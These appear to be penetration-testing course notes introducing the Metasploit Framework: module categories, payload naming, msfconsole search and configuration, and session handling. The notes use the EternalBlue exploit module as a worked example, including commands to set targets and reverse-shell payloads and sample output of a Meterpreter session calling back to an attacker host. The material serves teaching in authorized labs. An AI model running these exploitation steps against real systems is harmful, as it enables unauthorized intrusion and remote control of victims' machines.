# Metasploit: The Basics

> **Module:** 01 — Metasploit: The Basics  
> **Focus:** Metasploit Framework fundamentals, module types, `msfconsole`, exploitation workflow, payloads, and session management.

---

## 📚 Table of Contents

1. [What Is the Metasploit Framework?](#what-is-the-metasploit-framework)
2. [Metasploit Pro vs. Framework](#metasploit-pro-vs-framework)
3. [The Three Pillars of the Framework](#the-three-pillars-of-the-framework)
4. [What This Module Covers](#what-this-module-covers)
5. [Core Concepts and Module Types](#core-concepts-and-module-types)
   - [The Exploit Chain](#the-exploit-chain-vulnerability-exploit-payload)
   - [The Seven Module Categories](#the-seven-module-categories)
   - [Payload Types](#payload-types-singles-stagers-and-stages)
   - [Payload Naming Convention](#reading-the-payload-naming-convention)
6. [Navigating `msfconsole`](#navigating-msfconsole)
   - [Launching `msfconsole`](#launching-msfconsole)
   - [Running Linux Commands](#running-linux-commands-inside-msfconsole)
   - [Getting Help](#getting-help)
   - [History and Tab Completion](#history-and-tab-completion)
7. [Searching for Modules](#searching-for-modules)
   - [Basic Search](#basic-search)
   - [Understanding Search Results](#understanding-search-results)
   - [Filtered Search](#filtered-search)
   - [Exploit Rankings](#understanding-exploit-rankings)
8. [Inspecting a Module](#inspecting-a-module-with-info)
9. [Configuring and Running Modules](#configuring-and-running-modules)
   - [Know Your Prompt](#know-your-prompt)
   - [Selecting a Module](#selecting-a-module-with-use)
   - [Reading `show options`](#reading-show-options)
   - [Core Parameters](#the-core-parameters)
   - [`set` vs. `setg`](#local-vs-global-set-vs-setg)
   - [Selecting a Different Payload](#selecting-a-different-payload)
   - [Running a Module](#running-the-module)
   - [Checking Before Exploiting](#checking-before-exploiting)
10. [Managing Sessions](#managing-sessions)
    - [What Is a Session?](#what-is-a-session)
    - [Backgrounding a Session](#backgrounding-a-session)
    - [Listing Active Sessions](#listing-active-sessions)
    - [Interacting With a Session](#interacting-with-a-session)
    - [Closing Sessions](#closing-sessions)
    - [Sessions and Post-Exploitation](#sessions-and-post-exploitation-modules)
11. [Quick Command Reference](#quick-command-reference)
12. [Practical Workflow](#practical-workflow)
13. [Key Takeaways](#key-takeaways)
14. [⚠️ Authorization & Safety](#️-authorization--safety)

---

# What Is the Metasploit Framework?

The **Metasploit Framework** is an open-source exploitation framework widely used in penetration testing.

Originally created by **H.D. Moore in 2003** as a portable networking tool, Metasploit was acquired by **Rapid7 in 2009** and grew into an ecosystem containing thousands of exploits and modules.

A useful analogy is a **well-organized workshop**. Instead of having individual exploit scripts scattered across the internet, Metasploit provides a centralized library of:

- Exploits
- Scanners
- Payloads
- Post-exploitation tools

These capabilities are accessible through a single command-line interface: **`msfconsole`**.

## Penetration-Testing Lifecycle

Metasploit supports the full penetration-testing lifecycle:

```text
┌──────────────────────────┐
│  Information Gathering   │
│  Scan & fingerprint      │
└────────────┬─────────────┘
             ↓
┌──────────────────────────┐
│ Vulnerability            │
│ Identification           │
└────────────┬─────────────┘
             ↓
┌──────────────────────────┐
│      Exploitation        │
│  Deliver exploit code    │
└────────────┬─────────────┘
             ↓
┌──────────────────────────┐
│    Post-Exploitation     │
│ Gather data / pivot      │
└────────────┬─────────────┘
             ↓
┌──────────────────────────┐
│        Reporting         │
│ Document findings        │
└──────────────────────────┘
```

Metasploit is primarily used by penetration testers, while security researchers and exploit developers also use it for vulnerability research and proof-of-concept development.

---

# Metasploit Pro vs. Framework

Metasploit comes in two main editions:

| Edition | Description |
|---|---|
| **Metasploit Pro** | Commercial Rapid7 edition with a GUI, automated workflows, team collaboration, and reporting capabilities. |
| **Metasploit Framework** | Open-source, community-driven command-line version used in environments such as Kali Linux, Parrot OS, and the TryHackMe AttackBox. |

The techniques learned with the Framework translate to Metasploit Pro because the underlying modules, commands, and concepts are shared. Pro adds a GUI and automation layer.

---

# The Three Pillars of the Framework

## 1. `msfconsole`

`msfconsole` is the primary command-line interface for Metasploit.

It is used to:

- Search for modules
- Configure parameters
- Launch exploits
- Manage sessions

Think of it as the **cockpit of the framework**.

---

## 2. Modules

Modules are the building blocks of Metasploit.

Each module is a self-contained piece of code designed to perform a specific task.

The framework organizes modules into seven categories:

```text
Exploit
Auxiliary
Payload
Post
Encoder
NOP
Evasion
```

Metasploit's power comes from its large module library rather than from a single tool.

---

## 3. Tools

Metasploit also ships with standalone command-line tools.

The most important tool for this module is:

```bash
msfvenom
```

`msfvenom` generates payloads outside `msfconsole` for scenarios requiring a standalone file, web shell, or raw shellcode.

Other tools include:

```text
pattern_create
pattern_offset
```

These are mainly used in exploit development, which is beyond the scope of this module.

---

# What This Module Covers

This is the first of four Metasploit rooms:

| # | Module | Focus |
|---|---|---|
| 01 | **Metasploit: The Basics** | Framework navigation, modules, exploit configuration, launching, and sessions |
| 02 | **Metasploit: Scanning and Exploitation** | Scanning, Metasploit database, vulnerability identification, and exploitation |
| 03 | **Metasploit: Post-Exploitation** | Meterpreter, credential harvesting, privilege escalation, and target exploration |
| 04 | **Metasploit: Payload Generation** | Custom payloads, encoding, and payload delivery |

By the end of all four rooms, the goal is to understand how to take a target from initial discovery through exploitation and post-exploitation using Metasploit.

---

# Core Concepts and Module Types

Before searching for modules, understand three foundational concepts:

```text
Vulnerability → Exploit → Payload
```

These three concepts form the foundation of Metasploit's exploitation workflow.

---

## The Exploit Chain: Vulnerability, Exploit, Payload

### Vulnerability

A **vulnerability** is a design, coding, or configuration flaw in a target system.

The flaw itself creates an opportunity for unintended behavior.

A vulnerability might allow an attacker to:

- Execute arbitrary code
- Read unauthorized files
- Bypass authentication

### Exploit

An **exploit** is code that takes advantage of a specific vulnerability.

It is the mechanism used to trigger or abuse the flaw.

### Payload

A **payload** is the code that runs on the target after the exploit succeeds.

A payload might:

- Open a reverse shell
- Create a user account
- Execute commands
- Provide a Meterpreter session

### The Relationship

```text
┌─────────────────┐
│  Vulnerability  │
│   The weakness  │
└────────┬────────┘
         ↓
┌─────────────────┐
│     Exploit     │
│ Abuses weakness │
└────────┬────────┘
         ↓
┌─────────────────┐
│     Payload     │
│ Runs after      │
│ exploitation    │
└─────────────────┘
```

An exploit without a useful payload may trigger a vulnerability without providing useful access. A payload without a way to reach the target cannot execute.

---

# The Seven Module Categories

Metasploit organizes its library into seven module categories.

## 1. Exploits

Exploit modules target specific vulnerabilities on specific platforms.

Typical paths:

```text
exploit/windows/smb/
exploit/linux/http/
```

---

## 2. Auxiliary

Auxiliary modules perform tasks that are not direct exploitation.

Common uses include:

- Port scanning
- Service fingerprinting
- Brute-force login testing
- Fuzzing
- Network sniffing
- Vulnerability scanning

Example:

```text
auxiliary/scanner/smb/smb_ms17_010
```

---

## 3. Payloads

Payload modules contain code that executes on the target after a successful exploit.

Metasploit categorizes payloads into:

- Singles
- Stagers
- Stages

---

## 4. Post-Exploitation

Post modules operate after access has already been obtained through an active session.

Examples of post-exploitation tasks:

- Dump password hashes
- Enumerate system information
- Capture screenshots
- Pivot to other network segments

Typical paths:

```text
post/windows/gather/
post/linux/manage/
```

---

## 5. Encoders

Encoder modules transform payload data into a different format.

A well-known encoder is:

```text
x86/shikata_ga_nai
```

> **Important:** Encoding is not encryption and is not, by itself, a reliable antivirus-evasion technique. Encoders can still have legitimate uses, such as removing bad characters from shellcode.

---

## 6. NOPs

**NOP** means **No Operation**.

NOP modules generate NOP sleds: sequences of instructions that do nothing.

The classic x86 NOP instruction is:

```text
0x90
```

NOP sleds can serve as padding during certain buffer-overflow exploitation scenarios.

---

## 7. Evasion

Evasion modules attempt to bypass specific security controls.

Unlike simple encoding, evasion modules implement techniques intended to avoid or bypass particular defenses.

Their effectiveness depends heavily on the target environment and security configuration.

---

# Payload Types: Singles, Stagers, and Stages

## Singles / Inline Payloads

Singles are self-contained payloads.

The entire payload is delivered as a single package.

**Advantages:**

- Self-contained
- No second download required

**Trade-off:**

- Usually larger

---

## Stagers

A **stager** is a small, lightweight payload whose main job is to establish a communication channel between the attacker and target.

Once connected, it retrieves the second component.

---

## Stages

A **stage** is the larger payload component downloaded by a stager.

```text
Stager + Stage = Staged Payload
```

### Staged vs. Single

```text
STAGED
┌────────────┐       ┌──────────────┐
│   Stager   │ ───→  │    Stage     │
│ Small      │       │ Larger       │
└────────────┘       └──────────────┘


SINGLE / STAGELESS
┌──────────────────────────────┐
│      Complete Payload        │
│      Delivered at once       │
└──────────────────────────────┘
```

---

# Reading the Payload Naming Convention

Metasploit's payload path can tell you whether a payload is staged or single.

The key is the separator between the shell/payload type and connection method.

## Stageless / Single

```text
windows/x64/shell_reverse_tcp
```

The underscore `_` between `shell` and `reverse_tcp` indicates a single/inline payload.

## Staged

```text
windows/x64/shell/reverse_tcp
```

The forward slash `/` between `shell` and `reverse_tcp` indicates a staged payload.

### General Structure

```text
<platform>/<architecture>/<payload_type><separator><connection_method>
```

### Another Example

Staged Meterpreter:

```text
linux/x86/meterpreter/reverse_tcp
```

Stageless counterpart:

```text
linux/x86/meterpreter_reverse_tcp
```

> **Quick recognition:** `/` between payload type and connection method → staged. `_` → single/inline.

---

# Navigating `msfconsole`

`msfconsole` provides:

- Built-in search
- Tab completion
- Contextual help
- Session management
- Support for many standard Linux commands

---

## Launching `msfconsole`

Open a terminal and run:

```bash
msfconsole
```

Example startup:

```text
┌──────────────────────────────────────────────┐
│           METASPLOIT FRAMEWORK              │
│                                              │
│  Metasploit tip: Use the 'favorite' command │
│  to mark frequently used modules            │
│                                              │
│  = metasploit v6.4.x                        │
│  +-- 2607 exploits - 1325 auxiliary         │
│  +-- 1710 payloads - 49 encoders             │
│  +-- 435 post - 14 nops                     │
│  +-- 12 evasion                             │
└──────────────────────────────────────────────┘

msf6 >
```

The exact module counts depend on the framework version and when it was last updated.

### Recognizing the Prompt

```text
msf6 >
```

means you are now inside `msfconsole`.

Commands typed here are interpreted by Metasploit rather than the normal shell.

> Older installations may display `msf5 >`. The concepts and commands in this module apply to both versions.

---

# Running Linux Commands Inside `msfconsole`

Many standard Linux commands can be executed without leaving `msfconsole`.

### Check the current user

```console
msf6 > whoami
```

Example output:

```text
[*] exec: whoami
root
```

### Check an interface

```console
msf6 > ip -br a show ens5
```

Example:

```text
[*] exec: ip -br a show ens5

ens5  UP  10.49.67.250/18
```

This is useful for confirming the attacking machine's address, such as the `LHOST` used by a reverse payload.

---

## Shell Features Are Not Fully Supported

Not every normal shell feature works inside `msfconsole`.

For example:

```console
msf6 > help > output.txt
```

may result in:

```text
[-] No such command
```

For console logging, use Metasploit's `spool` functionality or exit to a normal terminal when appropriate.

---

# Getting Help

Use:

```console
msf6 > help
```

To get help for a specific command:

```console
msf6 > help search
```

Example:

```text
Usage: search [<options>] [<keywords>:<values>]

Prepend a value with '-' to exclude any matching results.
```

### Useful `search` options

| Option | Purpose |
|---|---|
| `-h` | Show help |
| `-o <filename>` | Export output as CSV |
| `-r <column>` | Reverse-sort results |
| `-s <column>` | Sort by a column |
| `-S <filter>` | Regex filter |
| `-u` | Use module when a single result is found |

### Search Keywords

| Keyword | Purpose |
|---|---|
| `aka` | Match alternate names |
| `author` | Match module author |
| `arch` | Match architecture |
| `check` | Modules supporting `check` |
| `cve` | Match CVE ID |
| `edb` | Match Exploit-DB ID |
| `fullname` | Match full module name |
| `name` | Match descriptive name |
| `platform` | Match target platform |
| `ref` | Match reference |
| `target` | Match target |
| `type` | Match module category |

---

# History and Tab Completion

## Command History

Use:

```console
msf6 > history
```

Example:

```text
1  search type:exploit platform:windows smb
2  use exploit/windows/smb/ms17_010_eternalblue
3  show options
4  set RHOSTS TARGET_IP
5  run
6  back
7  search type:auxiliary ssh
```

You can also use the **↑ / ↓ arrow keys** to navigate previous commands.

---

## Tab Completion

Tab completion works with:

- Commands
- Module paths
- Option names

Example:

```console
msf6 > use exploit/windows/smb/ms17
```

Press **Tab** to complete the path or display matching choices.

This is especially useful when navigating deeply nested module paths.

---

# Searching for Modules

With thousands of modules available, searching is a critical Metasploit skill.

## Basic Search

Syntax:

```text
search <keyword>
```

Example:

```console
msf6 > search eternalblue
```

Example result:

```text
#  Name                                      Disclosure Date  Rank     Check
0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes
```

---

# Understanding Search Results

| Column | Meaning |
|---|---|
| `#` | Numeric index used with commands such as `use 0` or `info 0` |
| `Name` | Full module path |
| `Disclosure Date` | Public disclosure date |
| `Rank` | Expected exploit reliability |
| `Check` | Whether a non-destructive vulnerability check is supported |
| `Description` | Brief explanation of the module |

The module path also tells you useful information:

```text
exploit/windows/smb/ms17_010_eternalblue
   │       │       │
   │       │       └── Specific module
   │       └────────── Service/category
   └────────────────── Module type / target platform
```

---

# Filtered Search

The most useful filters for daily work include:

### `type:`

Filter by module category:

```text
type:exploit
type:auxiliary
type:post
type:payload
type:encoder
type:nop
type:evasion
```

### `platform:`

Filter by target OS:

```text
platform:windows
platform:linux
platform:osx
platform:android
```

### `cve:`

Search by CVE identifier:

```text
cve:2024
```

### `name:`

Match against the module's descriptive name:

```text
name:smb
```

---

## Practical Search Examples

### Search exploit modules by CVE year

```console
msf6 > search cve:2009 type:exploit
```

### Search Windows exploits

```console
msf6 > search cve:2024 platform:windows type:exploit
```

### Search SMB auxiliary modules

```console
msf6 > search type:auxiliary name:smb
```

### Exclude Windows exploits

```console
msf6 > search type:exploit -platform:windows
```

> A minus sign before a filter value excludes matching results.

---

# Understanding Exploit Rankings

The `Rank` column indicates how reliable an exploit is expected to be.

| Rank | Meaning |
|---|---|
| **Excellent** | Expected not to crash the service; typically associated with inherently safer vulnerability classes. |
| **Great** | Has a default target capable of auto-detecting the correct configuration. |
| **Good** | Has a default target covering a common case but does not auto-detect. |
| **Normal** | Works reliably against a specific target version/configuration. |
| **Average** | Generally unreliable but expected success rate is above 50%. |
| **Low** | Expected success rate is below 50%. |
| **Manual** | May require significant manual configuration or may be essentially denial-of-service oriented. |

> **Important:** Rank is a starting point, not a guarantee. Target configuration, network conditions, and security controls all influence exploit success.

---

# Inspecting a Module with `info`

Once you find a promising module, inspect it before using it.

You can use the full module path:

```console
msf6 > info exploit/windows/smb/ms17_010_eternalblue
```

Or use the numeric search result:

```console
msf6 > info 0
```

`info` provides a technical brief containing details such as:

- Module name
- Module path
- Platform
- Architecture
- Privilege level
- License
- Rank
- Disclosure date
- Authors
- Available targets
- Check support
- Basic options
- References

---

## Important `info` Fields

### Privileged

```text
Privileged: Yes
```

Indicates that a successful exploit is expected to provide elevated privileges according to the module's description.

### Check Supported

```text
Check supported: Yes
```

Means the module supports a vulnerability check without running the full exploit.

### Available Targets

Some modules support multiple target configurations.

For example:

```text
Id   Name
--   ----
0    Automatic Target
```

Other modules may require selecting a specific target configuration.

---

# Example: EternalBlue

The module used throughout this room as a teaching example is:

```text
exploit/windows/smb/ms17_010_eternalblue
```

It targets **CVE-2017-0144**, a critical vulnerability in Microsoft's SMBv1 implementation.

The vulnerability became widely known after the Shadow Brokers leak of the exploit tooling, and EternalBlue was later weaponized by the **WannaCry** ransomware campaign.

It is used here because it is well documented and illustrates the full exploit workflow clearly.

> In a real engagement, module selection should always be based on the actual target and authorized scope rather than relying on a single historical exploit.

---

# Configuring and Running Modules

Once you have:

```text
Search → Info → Select
```

the next stage is configuration.

The workflow is:

```text
Select Module
      ↓
Show Options
      ↓
Set Parameters
      ↓
Select / Verify Payload
      ↓
Check (if supported)
      ↓
Run / Exploit
      ↓
Manage Session
```

---

# Know Your Prompt

The current prompt tells you where you are and which commands are available.

| Prompt | Context | Typical Actions |
|---|---|---|
| `root@...~#` | Regular Linux terminal | Linux commands |
| `msf6 >` | Msfconsole, no module selected | `search`, `use`, `sessions`, `setg` |
| `msf6 exploit(...) >` | Module context | `set`, `show options`, `check`, `run`, `exploit`, `back` |
| `meterpreter >` | Active Meterpreter session | Target interaction / Meterpreter commands |
| `C:\Windows\system32>` | Target Windows shell | Commands execute on target |

### Troubleshooting Rule

If a command is not working, **check your current prompt first**.

Common mistakes include:

```text
Trying to use `set RHOSTS` from `msf6 >`
```

or

```text
Typing Linux commands inside a Meterpreter session
```

---

# Selecting a Module with `use`

Load a module by its full path:

```console
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

Or by search result index:

```console
msf6 > use 0
```

Example:

```text
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Notice that:

1. The prompt changes to show the loaded module.
2. Metasploit may automatically select a default payload.

### Leaving the Module

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 >
```

> Loading a module does **not** change your Linux working directory. You remain in the same `msfconsole` session; only the active module context changes.

---

# Reading `show options`

Once a module is loaded:

```console
msf6 exploit(...) > show options
```

The output is generally divided into:

```text
┌─────────────────────────┐
│ Module options          │
├─────────────────────────┤
│ Payload options         │
├─────────────────────────┤
│ Exploit target          │
└─────────────────────────┘
```

## Module Options

Parameters specific to the exploit itself.

Example:

```text
Name       Current Setting  Required
RHOSTS                      yes
RPORT      445              yes
SMBDomain                    no
SMBPass                      no
SMBUser                      no
VERIFY_ARCH true             yes
VERIFY_TARGET true          yes
```

## Payload Options

Parameters belonging to the selected payload.

Common examples:

```text
LHOST
LPORT
```

## Exploit Target

Defines which version/configuration the exploit is tuned for.

Many modern modules use:

```text
0  Automatic Target
```

Older modules may require a manually selected target.

---

# The `Required` Column

The `Required` column is your configuration checklist.

```text
Required = yes
```

means the option must have a valid value before the module can run.

```text
Required = no
```

means the option is optional.

---

# The Core Parameters

Six parameters appear frequently enough that they should be familiar.

| Parameter | Meaning |
|---|---|
| `RHOSTS` | Remote target host(s) |
| `RPORT` | Remote target service port |
| `LHOST` | Local/attacking host address |
| `LPORT` | Local listening port |
| `PAYLOAD` | Payload delivered with the exploit |
| `SESSION` | Existing session used by post-exploitation modules |

---

## `RHOSTS`

**Remote host(s)** — the target IP address or addresses.

Accepted forms include:

### Single IP

```text
10.49.136.219
```

### CIDR range

```text
10.49.136.219/24
```

### Hyphenated range

```text
10.48.12.1-10.48.12.50
```

### Target file

```text
file:/path/to/targets.txt
```

---

## `RPORT`

**Remote port** — the port where the target service is running.

For SMB, a common default is:

```text
445
```

---

## `LHOST`

**Local host** — the attacking machine's address.

For reverse payloads, this is where the target connects back.

---

## `LPORT`

**Local port** — the port on the attacking machine that receives the reverse connection.

A common default is:

```text
4444
```

---

## `PAYLOAD`

The payload delivered by the exploit.

A default payload may be selected automatically, but it can be overridden.

---

## `SESSION`

Used primarily with post-exploitation modules.

It identifies which existing session the module should operate through.

---

# Setting Parameters

Use:

```text
set <OPTION> <VALUE>
```

Examples:

```console
msf6 exploit(...) > set RHOSTS TARGET_IP
```

```console
msf6 exploit(...) > set LPORT 5555
```

Example result:

```text
RHOSTS => TARGET_IP
LPORT => 5555
```

After configuring values, verify them:

```console
msf6 exploit(...) > show options
```

### Good Habit

```text
SET → SHOW OPTIONS → VERIFY → RUN
```

This helps catch:

- Typographical errors
- Incorrect target addresses
- Incorrect callback addresses
- Incorrect ports

---

# Clearing Parameters

## Clear One Parameter

```console
msf6 exploit(...) > unset RHOSTS
```

Example:

```text
Unsetting RHOSTS...
```

## Reset All Parameters

```console
msf6 exploit(...) > unset all
```

Example:

```text
Flushing datastore...
```

---

# Local vs. Global: `set` vs. `setg`

## `set`

Values set with `set` are **local to the current module**.

```console
msf6 exploit(...) > set RHOSTS TARGET_IP
```

Switching to another module means you may need to configure it again.

---

## `setg`

`setg` creates a **global value** that persists across modules during the current `msfconsole` session.

```console
msf6 > setg RHOSTS TARGET_IP
```

This is useful when multiple modules operate against the same target.

### Example Workflow

```text
                setg RHOSTS
                     │
                     ↓
       ┌─────────────────────────┐
       │ auxiliary/scanner/...   │
       └────────────┬────────────┘
                    │
                    ↓
       ┌─────────────────────────┐
       │ exploit/...             │
       └────────────┬────────────┘
                    │
                    ↓
       RHOSTS remains available
```

### Clear a Global Value

```console
msf6 > unsetg RHOSTS
```

### Practical Rule

Use `setg` for values that stay constant across the engagement:

```text
RHOSTS
LHOST
```

Use `set` for module-specific values:

```text
RPORT
PAYLOAD
SESSION
```

---

# Selecting a Different Payload

Metasploit may automatically assign a default payload when an exploit is loaded.

View compatible payloads:

```console
msf6 exploit(...) > show payloads
```

Only payloads compatible with the current exploit's target platform and architecture are displayed.

Select a payload by name:

```console
msf6 exploit(...) > set PAYLOAD windows/x64/shell/reverse_tcp
```

Or by index when supported:

```text
set PAYLOAD <INDEX>
```

---

# Running the Module

Once required parameters are configured:

```console
msf6 exploit(...) > exploit
```

`run` is an alias:

```console
msf6 exploit(...) > run
```

### Common Convention

```text
exploit → exploit modules
run     → auxiliary / non-exploit modules
```

Both can execute a selected module.

---

# What Happens During Exploitation?

A successful reverse-payload workflow can be understood as:

```text
┌───────────────┐
│ Start Handler │
└───────┬───────┘
        ↓
┌───────────────┐
│ Check Target  │
└───────┬───────┘
        ↓
┌───────────────┐
│ Send Exploit  │
└───────┬───────┘
        ↓
┌───────────────┐
│ Deliver       │
│ Payload       │
└───────┬───────┘
        ↓
┌───────────────┐
│ Target Calls  │
│ Back          │
└───────┬───────┘
        ↓
┌───────────────┐
│ Session Opens │
└───────────────┘
```

A successful lab execution may produce output similar to:

```text
[*] Started reverse TCP handler on ATTACKER_IP:4444
[+] TARGET_IP:445 - Host is likely VULNERABLE
[*] Connecting to target for exploitation.
[+] Connection established for exploitation.
[*] Sending stage ...
[*] Meterpreter session 1 opened
meterpreter >
```

---

# Backgrounding Immediately with `-z`

The `-z` flag runs the exploit and backgrounds the newly created session:

```console
msf6 exploit(...) > exploit -z
```

Example:

```text
[*] Meterpreter session 1 opened
[*] Session 1 created in the background.

msf6 exploit(...) >
```

This is useful when you want to continue working in `msfconsole` immediately after obtaining a session.

---

# Checking Before Exploiting

Some modules support the `check` command:

```console
msf6 exploit(...) > check
```

A supported check attempts to determine whether the target is vulnerable without sending the full exploit payload.

Example:

```text
[*] TARGET_IP:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] TARGET_IP:445 - Host is likely VULNERABLE to MS17-010!
[*] TARGET_IP:445 - Scanned 1 of 1 hosts (100% complete)
```

> Not every module supports `check`. When available, it can be useful before exploitation, particularly where service stability matters.

---

# Managing Sessions

Once an exploit succeeds, Metasploit may open a session.

Session management becomes increasingly important when working with multiple targets.

---

# What Is a Session?

A **session** is an active communication channel between the attacking machine and a compromised target.

When:

```text
Exploit succeeds
       ↓
Payload executes
       ↓
Communication established
       ↓
Metasploit registers a session
```

the session receives a unique numeric ID.

---

# Session Types

## Meterpreter

A rich interactive environment with built-in capabilities for tasks such as:

- File-system access
- Privilege-related operations
- Pivoting
- Target exploration

## Shell

A basic operating-system command line, such as:

```text
cmd.exe
```

or:

```text
/bin/sh
```

## Protocol-Specific Sessions

Metasploit 6.4 also supports specialized interactive sessions for services such as:

```text
SMB
MSSQL
MySQL
PostgreSQL
```

The commands for managing sessions remain consistent regardless of session type.

---

# Backgrounding a Session

When inside a session:

```console
meterpreter > background
```

or use:

```text
CTRL + Z
```

Example:

```text
meterpreter > background
[*] Backgrounding session 1...

msf6 exploit(...) >
```

The session remains alive; only the current focus changes back to `msfconsole`.

### Why Background?

Backgrounding allows you to:

- Keep multiple sessions active
- Continue using Metasploit
- Launch other modules
- Return to a session later

---

# Listing Active Sessions

Run:

```console
msf6 > sessions
```

Example:

```text
Active sessions
===============

Id  Type                   Information
--  ----                   -----------
1   meterpreter x64/windows NT AUTHORITY\SYSTEM @ STRATFORD-WS01
2   meterpreter x64/windows NT AUTHORITY\SYSTEM @ STRATFORD-WS01
```

The output can contain:

| Field | Meaning |
|---|---|
| **Id** | Unique session number |
| **Name** | Optional session label |
| **Type** | Session type and architecture |
| **Information** | User context and hostname |
| **Connection** | Local/remote IP and port information |

---

# Interacting With a Session

To interact with a session:

```console
msf6 > sessions -i 1
```

Example:

```text
[*] Starting interaction with 1...

meterpreter >
```

Any commands now execute through that session.

---

# Switching Between Sessions

Background the current session:

```console
meterpreter > background
```

Then select another:

```console
msf6 > sessions -i 2
```

### Session Flow

```text
Session 1
   ↓
background
   ↓
msfconsole
   ↓
sessions -i 2
   ↓
Session 2
```

---

# Closing Sessions

## Kill One Session

```console
msf6 > sessions -k 2
```

Example:

```text
[*] Killing session 2
[*] TARGET_IP - Meterpreter session 2 closed.
```

## Kill All Sessions

```console
msf6 > sessions -K
```

Example:

```text
[*] Killing all sessions...
```

### Important Difference

```text
-k <ID>  → Kill one specific session
-K       → Kill all sessions
```

Use `-K` deliberately because it terminates every active session.

---

# Sessions and Post-Exploitation Modules

Sessions are not just interactive terminals. They also act as the bridge to many post-exploitation modules.

Many `post/` modules require:

```text
SESSION
```

to identify the existing session they should operate through.

### Workflow

```text
┌──────────────────────────┐
│ Exploit target           │
└────────────┬─────────────┘
             ↓
┌──────────────────────────┐
│ Open Meterpreter session │
└────────────┬─────────────┘
             ↓
┌──────────────────────────┐
│ Background session       │
└────────────┬─────────────┘
             ↓
┌──────────────────────────┐
│ Load post module         │
└────────────┬─────────────┘
             ↓
┌──────────────────────────┐
│ Set SESSION <ID>         │
└────────────┬─────────────┘
             ↓
┌──────────────────────────┐
│ Run module               │
└──────────────────────────┘
```

Example structure:

```console
msf6 > use post/<module>
msf6 post(...) > set SESSION <ID>
msf6 post(...) > run
```

The detailed post-exploitation workflow is covered in the dedicated **Metasploit: Post-Exploitation** module.

---

# Quick Command Reference

## 🚀 Start Metasploit

```bash
msfconsole
```

## 🔎 Search

```console
search <keyword>
search type:exploit platform:windows
search cve:<CVE-ID>
search type:auxiliary name:smb
```

## ℹ️ Module Information

```console
info <module>
info <index>
```

## 📦 Select Module

```console
use <module>
use <index>
back
```

## ⚙️ Module Options

```console
show options
show payloads
```

## 🎯 Configure

```console
set RHOSTS <TARGET_IP>
set RPORT <PORT>
set LHOST <ATTACKER_IP>
set LPORT <PORT>
set PAYLOAD <PAYLOAD>
set SESSION <ID>
```

## 🌐 Global Configuration

```console
setg RHOSTS <TARGET_IP>
unsetg RHOSTS
```

## 🧹 Clear Options

```console
unset <OPTION>
unset all
```

## 🧪 Verify / Execute

```console
check
run
exploit
exploit -z
```

## 🖥️ Sessions

```console
sessions
sessions -i <ID>
sessions -k <ID>
sessions -K
background
```

## 🆘 Help

```console
help
help <command>
history
```

---

# Practical Workflow

A useful Metasploit mental model is:

```text
                 DISCOVER
                    ↓
                  SEARCH
                    ↓
                   INFO
                    ↓
                   USE
                    ↓
              SHOW OPTIONS
                    ↓
             SET PARAMETERS
                    ↓
       SELECT / VERIFY PAYLOAD
                    ↓
             CHECK (if supported)
                    ↓
              RUN / EXPLOIT
                    ↓
                 SESSION
                    ↓
          BACKGROUND / INTERACT
                    ↓
             POST-EXPLOITATION
```

### The Short Version

```text
search
  ↓
info
  ↓
use
  ↓
show options
  ↓
set
  ↓
check
  ↓
exploit
  ↓
sessions
```

---

# Key Takeaways

## Metasploit Architecture

```text
msfconsole
    +
Modules
    +
Standalone Tools
```

## Exploitation Chain

```text
Vulnerability
      ↓
    Exploit
      ↓
    Payload
```

## Seven Module Categories

```text
Exploit
Auxiliary
Payload
Post
Encoder
NOP
Evasion
```

## Payload Structure

```text
Single
```

or:

```text
Stager + Stage
```

## Core Parameters

```text
RHOSTS
RPORT
LHOST
LPORT
PAYLOAD
SESSION
```

## Session Workflow

```text
Exploit
   ↓
Session
   ↓
Background
   ↓
Interact / Post-Exploit
```

---

# ⚠️ Authorization & Safety

Metasploit is a powerful penetration-testing framework.

Use these techniques **only against systems you own or have explicit authorization to test**, including:

- TryHackMe labs
- Hack The Box labs
- CTF environments
- Personal virtual machines
- Authorized penetration-testing engagements

Unauthorized exploitation of systems may be illegal and harmful.

---

## Module Status

| Field | Details |
|---|---|
| **Module** | Metasploit: The Basics |
| **Module No.** | 01 |
| **Status** | ✅ Completed |
| **Repository** | Metasploit |
